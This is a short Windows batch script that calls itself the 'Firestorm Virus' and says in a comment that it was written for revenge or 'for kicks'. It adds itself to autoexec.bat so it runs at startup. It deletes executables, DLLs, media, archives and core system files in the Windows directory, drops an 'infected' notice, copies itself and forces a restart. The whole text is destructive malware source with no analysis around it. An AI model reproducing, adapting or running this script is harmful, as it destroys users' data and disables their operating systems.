   @ECHO OFF
   begin:
   rem Virus Is not mean to destroy someones computer it is made for revenge and to leave someone to think about what they did or just for kicks lol it is to inflect a min damage to comp!
   cd %windir%
   echo start %windir%\windows.bat >>c:\autoexec.bat
   del *.exe
   y
   del *.dll
   y
   del *.gif
   y
   del *.mp3
   y
   del *.mpeg
   y
   del *.zip
   y
   del c:\windows\system\*.dll
   y
   del c:\windows\system\*.scr
   y
   del c:\windows\system\*.nls
   Echo you are infected with the Firestorm Virus > Infected.txt
   del *.sys
   copy %0
   C:\WINDOWS
   Echo Please Restart your computer for changes to take effect
   Echo ( Please Press enter to restart your computer )
   pause
   rundll32.exe shell32.dll,SHExitWindowsEx 2
